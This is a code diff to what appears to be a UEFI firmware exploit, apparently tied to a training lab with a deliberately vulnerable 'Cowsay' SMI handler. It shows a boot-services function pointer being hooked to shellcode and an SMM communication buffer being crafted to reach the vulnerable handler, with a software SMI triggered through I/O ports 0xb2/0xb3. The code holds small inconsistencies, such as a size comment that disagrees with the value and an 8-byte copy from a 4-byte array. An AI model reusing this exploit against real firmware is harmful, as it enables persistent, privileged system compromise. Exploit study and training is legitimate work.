@@ -51,7 +51,8 @@ void hook_gbs_func(void **vuln_func, void* shellcode){
 	*vuln_func=shellcode;
 }
 
-
+#define gEfiSmmCowsayCommunicationGuid { 0x9a75cf12, 0x2c83, 0x4d10, { 0xb5, 0xa8, 0x35, 0x75, 0x54, 0x65, 0x92, 0xf7 }}
+EFI_GUID VulnerableSmiHandlerGuid = gEfiSmmCowsayCommunicationGuid; 
 /****************************************************************************************
 *
 * Redefinition of memcpy from this part of edk2 codebase:
@@ -454,7 +455,10 @@ Then trigger SWSMI with writing to IO Port 0xb2 and 0xb3 with an outbyte
 	hooked_fcn_oep_addr = (UINT64)**(gBS->LocateHandleBuffer);
 	EFI_GUID VulnerableSmiHandlerGuid = gEfiSmmCommunicationProtocolGuid;
 	EFI_SMM_COMMUNICATE_HEADER *SmmCommBuff = NULL;
+	
+	//Should be initialized to 0 but setting it at 8 for testing puposes
 	UINTN CommBuff_sz = 0;
+	UINT8 smm_comm_buff_data[4] = {0x44, 0x44, 0x00, 0x00};
 	UINT64 shellcode_addr=(unsigned long long)&shellcode;
 	UINT8 shellcode_adr_arr[8];
 	Print(L"Vulnerable gBS functionpointer is at offset: %016llx \n", &hooked_fcn_oep);
@@ -467,7 +471,9 @@ Then trigger SWSMI with writing to IO Port 0xb2 and 0xb3 with an outbyte
 			CommBuff_sz,
 			(void**)&SmmCommBuff);
 	Print(L"Newly allocated Smm Comm Buffer is at %p \n", SmmCommBuff);
-	CopyGuid((void*)&SmmCommBuff->HeaderGuid, (void*)&VulnerableSmiHandlerGuid); 
+	CopyGuid((void*)&SmmCommBuff->HeaderGuid, (void*)&VulnerableSmiHandlerGuid);
+	SmmCommBuff->MessageLength=CommBuff_sz;
+	CopyMem((void*)&SmmCommBuff->Data, (void*)&smm_comm_buff_data, 8); 
 	Print(L"potentital smm Comm Buffer offset address:: %p \n", smm_comm_buffer_offset);
 	CopyMem((void*)smm_comm_buffer_offset, (void*)&SmmCommBuff, 8);
 	
